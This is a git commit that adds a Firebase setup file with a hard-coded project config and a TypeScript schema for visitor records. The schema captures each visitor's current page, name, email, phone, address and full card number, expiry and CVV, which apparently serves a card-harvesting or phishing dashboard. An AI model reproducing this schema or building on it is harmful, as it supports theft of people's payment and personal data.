8b9a8ee706238fbb2e3aa4069f073cf2128a36b0
S21Nexor <saggar676@gmail.com>
2026-05-07 17:05:31 +0300

    Initialize Firebase app and export services

---
+++ lib/firebase.ts
@@ -0,0 +1,42 @@
+import { initializeApp, getApps, getApp } from "firebase/app";
+import { getAuth } from "firebase/auth";
+import { getFirestore } from "firebase/firestore";
+import { getDatabase } from "firebase/database";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDunrPAssjA-ESc1jWfAuB-Rp6rcKh4Eso",
+  authDomain: "fawran-5733b.firebaseapp.com",
+  databaseURL: "https://fawran-5733b-default-rtdb.firebaseio.com",
+  projectId: "fawran-5733b",
+  storageBucket: "fawran-5733b.firebasestorage.app",
+  messagingSenderId: "793050907136",
+  appId: "1:793050907136:web:765138a85531c008eb0ee5",
+  measurementId: "G-3D0ZPNFXKL"
+};
+const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+const database = getDatabase(app);
+
+export { app, auth, db, database };
+
+export interface NotificationDocument {
+  id: string;
+  name: string;
+  hasPersonalInfo: boolean;
+  hasCardInfo: boolean;
+  currentPage: string;
+  time: string;
+  notificationCount: number;
+  personalInfo?: {
+    fullName: string;
+    email: string;
+    phone: string;
+    address: string;
+  };
+  cardInfo?: {
+    cardNumber: string;
+    expirationDate: string;
+    cvv: string;
+  };
+}
